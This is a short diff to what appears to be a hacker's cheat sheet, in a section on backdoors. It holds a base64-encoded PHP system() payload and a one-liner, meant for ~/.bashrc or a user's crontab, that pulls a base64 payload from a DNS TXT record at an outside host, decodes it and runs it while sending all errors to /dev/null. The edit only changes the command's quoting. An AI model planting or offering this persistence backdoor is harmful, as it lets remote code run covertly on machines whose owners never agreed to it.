@@ -1850,7 +1850,8 @@ echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 
 Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
 ```shell
-bash -c 'exec bash -c "{ $(sed s/\"//g <(dig +short b00m2.team-teso.net TXT)|base64 -d);}"'&>/dev/null
+# Use a "double bash" to redirect _also_ $()-subshell error to /dev/null:
+bash -c 'exec bash -c "{ $(dig +short b00m2.team-teso.net TXT|tr -d \"|base64 -d);}"'&>/dev/null
 ```
 
 <a id="ld-backdoor"></a>
